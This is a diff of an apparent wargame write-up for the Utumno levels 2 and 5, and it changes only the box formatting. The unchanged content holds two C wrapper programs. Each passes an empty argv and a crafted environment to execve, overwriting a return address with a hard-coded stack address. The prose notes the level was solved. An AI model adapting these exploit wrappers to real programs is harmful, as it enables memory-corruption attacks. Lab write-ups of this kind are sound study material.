@@ -13,10 +13,10 @@ So I took the payload/wrapper program that I wrote for utumno2, and tried it out
 
 
 				   u2wrapper.c
-	┌─────────────────────────────────────────────────────────────────┐
-	│#include <unistd.h>                                              │
-	│                                                                 │
-	│int main(void) {                                                 │
+	┌─────────────────────────────────────────────────────────────┐
+	│#include <unistd.h>                                          │
+	│                                                             │
+	│int main(void) {                                             │
 	│	char *environment[19] = {"AAAA", "BBBB", "CCCC", "DDDD",  │
 	│	"EEEE", "FFFF", "GGGG", "HHHH", "IIII",                   │
 	│	"AAAABBBBCCCCDDDD\x9c\xdf\xff\xff", "KKKK", "LLLL",       │
@@ -28,18 +28,18 @@ So I took the payload/wrapper program that I wrote for utumno2, and tried it out
 	│	char *argv[2] = {"./utumno2", 0};                         │
 	│	char *empty[] = {NULL};                                   │
 	│	execve("/utumno/utumno2", empty, environment);            │
-	│}                                                                │
-	└─────────────────────────────────────────────────────────────────┘
+	│}                                                            │
+	└─────────────────────────────────────────────────────────────┘
 
 So in this case, the  env var 'AAAABBBBCCCCDDDD\x9c...' ended up getting loaded into the return address already, writing address 0xffffdf9c...
 
 The only work to be done was altering the address to write (0xffffdfb6), and the level was solved.
 
 				   u5wrapper.c
-	┌─────────────────────────────────────────────────────────────────┐
-	│#include <unistd.h>                                              │
-	│                                                                 │
-	│int main(void) {                                                 │
+	┌─────────────────────────────────────────────────────────────┐
+	│#include <unistd.h>                                          │
+	│                                                             │
+	│int main(void) {                                             │
 	│	char *environment[19] = {"AAAA", "BBBB", "CCCC", "DDDD",  │
 	│	"EEEE", "FFFF", "GGGG", "HHHH", "IIII",                   │
 	│	"AAAAAAAAAAAAAAAA\xb6\xdf\xff\xff", "KKKK", "LLLL",       │
@@ -51,7 +51,7 @@ The only work to be done was altering the address to write (0xffffdfb6), and the
 	│	char *argv[2] = {"./utumno2", 0};                         │
 	│	char *empty[] = {NULL};                                   │
 	│	execve("/utumno/utumno5", empty, environment);            │
-	│}                                                                │
-	└─────────────────────────────────────────────────────────────────┘
+	│}                                                            │
+	└─────────────────────────────────────────────────────────────┘
 
 That's the level!
